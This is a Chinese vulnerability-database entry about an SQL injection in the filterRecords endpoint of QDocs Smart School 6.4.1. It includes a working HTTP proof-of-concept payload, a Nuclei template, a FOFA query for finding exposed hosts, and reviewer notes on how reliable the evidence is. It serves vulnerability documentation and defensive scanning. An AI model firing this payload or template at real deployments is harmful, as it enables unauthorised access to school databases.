---
source: "MrWQ/vulnerability-paper"
title: "QDocs Smart School filterRecords searchfield SQL注入"
product: "QDocs Smart School"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "6.4.1示例，MySQL XPath错误回显"
prerequisites: "请求匿名示例"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/5axvlF97KieYz97q3xyRuA"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/QDocs/QDocs%20Smart%20School%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20%28%E4%BB%98%20nuclei%20poc%29.md"
fofa_unverified: "搜索语句"
id: "vw-a5ab8e0fa5193d86b6ba7388"
entity_id: "ve-a5ab8e0fa5193d86b6ba7388"
schema_version: "1"
---

# QDocs Smart School filterRecords searchfield SQL注入

## 条目说明

- 对象与具体问题：QDocs Smart School；filterRecords searchfield SQL注入
- 版本、配置及部署条件：6.4.1示例，MySQL XPath错误回显
- 认证与权限前提：请求匿名示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 正文响应包含真实查询及MD5截断片段，证据强于仅500；500本身不能判定
- Nuclei双引号路径含\{转义为非法YAML转义/模板转存损坏，应修复后再标可用
- 标题附POC，verified true是作者断言未独立验证；max-request 3与单请求不一致
- RCE是可能后果需DB文件权限等额外条件；修复无明确版本；FOFA抽取残缺

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5axvlF97KieYz97q3xyRuA)

免责申明：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

01

—

漏洞名称

QDocs Smart School SQL 注入漏洞

02

—  

漏洞影响

Smart School 6.4.1

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMrpUUYN1lAGLCtDBdPxd2qWQJ0VViaOrSQA0SNmYuEBAIveaoT9lzJyzZicL6ic9tcAM6iaO8OiaR0nMg/640?wx_fmt=png)

03

—  

漏洞描述

QDocs Smart School 是一套智慧校园管理系统。Smart School 6.4.1 系统 filterRecords 接口存在 sql 注入漏洞，攻击者可获取数据库敏感数据，甚至执行命令, 进而有可能导致主机被远控。

04

—  

FOFA 搜索语句

  

```
body="close closebtnmodal"

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMrpUUYN1lAGLCtDBdPxd2qT8VlZbv9LWm30VtJhibTysNExffSBqzD9yvJh9uSyETA74FHBsTriaXA/640?wx_fmt=png)

05

—  

漏洞复现

poc 如下，计算 123456 的 MD5 值

```http
POST /course/filterRecords/ HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 224
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
searchdata[0][title]=&searchdata[0][searchfield]=1&searchdata[0][searchvalue]=1&searchdata[1][title]=1&searchdata[1][searchfield]=1=1 and extractvalue(1,concat(0x5e,(select md5(123456)),0x5e))%23&searchdata[1][searchvalue]=1

```

响应数据包如下

```
HTTP/1.1 500 Internal Server Error
Connection: close
Transfer-Encoding: chunked
Cache-Control: no-store, no-cache, must-revalidate
Content-Type: text/html; charset=UTF-8
Date: Tue, 14 Nov 2023 02:21:35 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: Apache
Set-Cookie: ci_session=0**************************************2; expires=Tue, 14-Nov-2023 04:21:35 GMT; Max-Age=7200; path=/; HttpOnly
Upgrade: h2,h2c
Vary: Accept-Encoding
X-Powered-By: PHP/7.4.33
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Database Error</title>
        <style type="text/css">
            ::selection { background-color: #E13300; color: white; }
            ::-moz-selection { background-color: #E13300; color: white; }
            body {
                background-color: #fff;
                margin: 40px;
                font: 13px/20px normal Helvetica, Arial, sans-serif;
                color: #4F5155;
            }
            a {
                color: #003399;
                background-color: transparent;
                font-weight: normal;
            }
            h1 {
                color: #444;
                background-color: transparent;
                border-bottom: 1px solid #D0D0D0;
                font-size: 19px;
                font-weight: normal;
                margin: 0 0 14px 0;
                padding: 14px 15px 10px 15px;
            }
            code {
                font-family: Consolas, Monaco, Courier New, Courier, monospace;
                font-size: 12px;
                background-color: #f9f9f9;
                border: 1px solid #D0D0D0;
                color: #002166;
                display: block;
                margin: 14px 0 14px 0;
                padding: 12px 10px 12px 10px;
            }
            #container {
                margin: 10px;
                border: 1px solid #D0D0D0;
                box-shadow: 0 0 8px #D0D0D0;
            }
            p {
                margin: 12px 15px 12px 15px;
            }
</style>
    </head>
    <body>
        <div>
            <h1>A Database Error Occurred</h1>
            <p>Error Number: 1105</p><p>XPATH syntax error: '^e10adc3949ba59abbe56e057f20f883'</p><p>SELECT `online_courses`.*, `course_category`.`category_name`        
FROM `online_courses`
LEFT JOIN `course_category` ON `course_category`.`id` = `online_courses`.`category_id`
WHERE 1 = 1 and extractvalue(1,concat(0x5e,(select md5(123456)),0x5e))# '1'
AND `online_courses`.`front_side_visibility` = 'yes'
AND `online_courses`.`status` = 1</p><p>Filename: models/Course_model.php</p><p>Line Number: 708</p>        </div>
    </body>
</html>

```

证明存在漏洞

06

—  

nuclei poc

poc 文件内容如下

```
id: smart-school-filterRecords-sqli
info:
  name: QDocs Smart School SQL注入漏洞
  author: fgz
  severity: high
  description: 'QDocs Smart School是一套智慧校园管理系统。Smart School 6.4.1系统filterRecords接口存在sql注入漏洞，攻击者可获取数据库敏感数据，甚至执行命令,进而有可能导致主机被远控。'
  tags: 2023,smart-school,sqli
  metadata:
    max-request: 3
    fofa-query: body="close closebtnmodal"
    verified: true
http:
  - method: POST
    path:
      - "\{\{BaseURL\}\}/course/filterRecords/"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "searchdata[0][title]=&searchdata[0][searchfield]=1&searchdata[0][searchvalue]=1&searchdata[1][title]=1&searchdata[1][searchfield]=1=1 and extractvalue(1,concat(0x5e,(select md5(123456)),0x5e))%23&searchdata[1][searchvalue]=1"
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 500 && contains(body,'e10adc3949ba59abbe56e057f20f883')"

```

运行 POC

```
nuclei.exe -t mypoc/其他/smart-school-filterRecords-sqli.yaml -u http://192.168.86.128:8990

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMrpUUYN1lAGLCtDBdPxd2qeCNWwJ1UJHDepnQYU3wxYxzEaLUPfKW6sjfib2g5Pky3G9D9jvNFbYw/640?wx_fmt=png)

07

—  

修复建议

升级到最新版本。

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
